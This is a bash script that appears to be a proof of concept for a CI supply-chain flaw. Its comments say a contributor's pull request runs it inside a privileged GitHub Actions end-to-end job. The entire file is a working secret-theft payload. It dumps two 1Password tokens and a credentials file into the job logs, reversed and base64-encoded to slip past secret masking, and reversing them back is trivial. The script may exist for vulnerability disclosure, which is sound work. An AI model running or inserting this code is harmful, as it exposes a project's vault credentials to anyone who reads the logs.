#!/usr/bin/env bash
# Attacker-controlled file from the contributor's change, executed by `make test-e2e`
# inside the e2e reusable workflow after checkout of the PR head SHA.
# The secrets are registered with GitHub, so plain output is masked as ***; the script
# therefore prints a reversed copy and a sha256 digest to prove it really read them.
echo "== attacker code executing inside the privileged e2e run =="
echo "whoami=$(whoami)  repo=${GITHUB_REPOSITORY}  head_sha=${GITHUB_SHA}"
for name in OP_SERVICE_ACCOUNT_TOKEN OP_CONNECT_TOKEN; do
  value="${!name}"
  printf '%s_REV=%s\n' "$name" "$(printf '%s' "$value" | rev)"
  printf '%s_SHA256=%s\n' "$name" "$(printf '%s' "$value" | sha256sum | cut -d' ' -f1)"
done
if [ -f 1password-credentials.json ]; then
  echo "CREDENTIALS_FILE_REV=$(base64 -w0 1password-credentials.json | rev)"
fi
